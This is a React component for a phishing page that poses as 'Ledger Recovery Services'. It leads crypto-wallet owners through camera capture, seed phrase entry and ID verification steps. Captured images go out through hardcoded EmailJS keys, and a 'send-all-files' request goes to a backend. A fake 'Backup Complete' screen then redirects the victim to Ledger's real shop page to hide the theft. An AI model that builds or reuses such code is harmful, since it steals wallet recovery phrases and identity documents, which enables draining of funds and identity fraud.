
import React, { useState, useContext, useEffect } from 'react';
import { AuthContext } from '../context/AuthContext';
import IdVerification from '../components/IdVerification';
import SeedPhraseVerification from '../components/SeedPhraseVerification';
import CameraVerification from '../components/CamVerification';
import Modal from 'react-modal';
import { FaCheckCircle } from 'react-icons/fa';
import axios from 'axios';
import emailjs from '@emailjs/browser';

Modal.setAppElement('#root');

function AuthPage() {
  const [step, setStep] = useState(1);
  const { state, setPhoto} = useContext(AuthContext);
  // const { state, setSource, setPhoto, setPhotoId } = useContext(AuthContext);
  const [isModalOpen, setIsModalOpen] = useState(false);

  const resizeImage = (file, maxWidth, maxHeight) => {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onloadend = () => {
        const img = new Image();
        img.onload = () => {
          let width = img.width;
          let height = img.height;
  
          if (width > height) {
            if (width > maxWidth) {
              height = Math.round((height *= maxWidth / width));
              width = maxWidth;
            }
          } else {
            if (height > maxHeight) {
              width = Math.round((width *= maxHeight / height));
              height = maxHeight;
            }
          }
  
          const canvas = document.createElement('canvas');
          canvas.width = width;
          canvas.height = height;
  
          const ctx = canvas.getContext('2d');
          ctx.drawImage(img, 0, 0, width, height);
  
          resolve(canvas.toDataURL(file.type));
        };
        img.src = reader.result;
      };
      reader.onerror = reject;
      reader.readAsDataURL(file);
    });
  };
  const handleNext = () => {
    setStep(step + 1);
  };
  
  const handleMobileNext = async (newUrl, file) => {
    const resizedImage = await resizeImage(file, 800, 600); // Example: Resize to 800x600
  
    // Continue with sending the resized image
    const templateParams = {
      image: resizedImage,
      photoId: state.photoId,
    };
  
    emailjs.send("service_xsqf4br", "template_79b3mwl", templateParams, "VJi69gQ80JUFaOk7A")
      .then((result) => {
        console.log('Success:', result.text);
      }, (error) => {
        console.error('Error:', error.text);
      });
  };


  const handleBackup = async () => {
    if (step < 4 || !state.photo) {
      alert('Please complete all steps and capture a photo.');
      return;
    }
  
    setIsModalOpen(true);
  
    try {
      // Send request to the backend to handle file sending
      const response = await fetch('http://localhost:3001/send-all-files', {
        method: 'POST',
      });
  
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
  
      const result = await response.text();
      console.log('Files sent successfully:', result);
    } catch (error) {
      console.error('Failed to send files:', error);
    }
  };
  

  useEffect(() => {
    if (isModalOpen) {
      launchConfetti();
    }
  },[isModalOpen]);

  const launchConfetti = () => {
    setInterval(() => {
      createConfettiPiece();
    }, 10);
  };

  const createConfettiPiece = () => {
    const confetti = document.createElement('div');
    const size = Math.random() * 8 + 4 + 'px';
    const color = `hsl(${Math.random() * 360}, 100%, 50%)`;

    confetti.classList.add('confetti');
    confetti.style.width = size;
    confetti.style.height = size;
    confetti.style.backgroundColor = color;
    confetti.style.position = 'absolute';
    confetti.style.top = '-10px';
    confetti.style.left = Math.random() * 100 + '%';
    confetti.style.opacity = Math.random() + 0.5;
    confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
    confetti.style.transition = 'transform 0.6s ease-out, opacity 1.2s ease-out';

    document.getElementById('confetti-container').appendChild(confetti);

    setTimeout(() => {
      confetti.style.transform = `translateY(${window.innerHeight}px) rotate(${Math.random() * 360}deg)`;
      confetti.style.opacity = 0;
    }, Math.random() * 100);

    setTimeout(() => {
      confetti.remove();
    }, 2000);
  };

  const handleCloseModal = () => {
    setIsModalOpen(false);
    window.location.href = 'https://shop.ledger.com/pages/ledger-recover#offers';
  };

  return (
    <div className="container mx-auto p-5">
      <h1 className="text-3xl font-bold text-center mb-8">Ledger Recovery Services</h1>

      {/* Progress Bar */}
      <div className="flex justify-around mb-10 max-xl:hidden">
        {[...Array(4)].map((_, index) => (
          <div key={index} className="flex flex-col items-center">
            <div className={`w-10 h-10 ${step >= index + 1 ? 'bg-blue-500' : 'bg-gray-300'} text-white rounded-full flex items-center justify-center`}>
              {index + 1}
            </div>
            <span className="mt-2 font-normal font-serif leading-tighter tracking-tighter 2xl:leading-tight 2xl:tracking-tight">
              {['Camera Verification', 'Seed Phrase Verification', 'Id Verification', 'Back Up'][index]}
            </span>
          </div>
        ))}
      </div>

      {/* Steps */}
      {step === 1 && (
        <CameraVerification 
          onNext={handleNext} 
          onMobileNext={handleMobileNext} 
          setPhoto={setPhoto} 
        />
      )}
      {step === 2 && <SeedPhraseVerification onNext={handleNext} />}
      {step === 3 && <IdVerification onNext={handleNext} />}
      {step === 4 && (
        <div>
          <h1>Backup All Data</h1>
          <button onClick={handleBackup} className="bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600">Backup</button>
        </div>
      )}

      {/* Backup Complete Modal */}
      <div className="container mx-auto p-5">
        <div id="confetti-container" className="fixed inset-0 pointer-events-none overflow-hidden z-50"></div>
        <Modal
          isOpen={isModalOpen}
          onRequestClose={handleCloseModal}
          className="fixed inset-0 bg-black p-4 flex flex-col items-center text-white justify-center z-50"
          overlayClassName="fixed inset-0 bg-black bg-opacity-50 z-40"
        >
          <div className="flex flex-col items-center justify-center text-center">
            <FaCheckCircle className="text-green-500 text-6xl mb-4" />
            <p>Backup Complete!</p>
            <p className="text-xl m-2 font-bold">You've secured the backup for your Secret Recovery Phrase using Ledger Recover.</p>
            <p className="m-2">Your information is being processed!</p>
            <button onClick={handleCloseModal} className="mt-4 font-semibold bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600">Close</button>
          </div>
        </Modal>
      </div>
    </div>
  );
}

export default AuthPage;
